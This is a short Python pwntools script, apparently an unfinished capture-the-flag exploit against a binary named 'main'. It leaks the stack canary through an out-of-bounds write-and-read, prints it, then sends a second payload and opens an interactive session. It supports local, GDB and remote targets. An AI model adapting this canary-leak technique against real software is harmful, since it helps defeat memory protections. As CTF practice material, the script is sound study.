#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('main')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+521
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def write_oob(value, count):
    io.sendlineafter(b":", value)
    io.sendlineafter(b":", str(count).encode())


def solve():

    write_oob(b"A" * 7, 1000)
    io.recvuntil(b"A" * (1001))
    canary = u64(io.recvline()[1:].strip(b"\n").rjust(8, b'\0'))
    info("canary: %#x", canary)

    write_oob(b"B" * 4, 1000)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

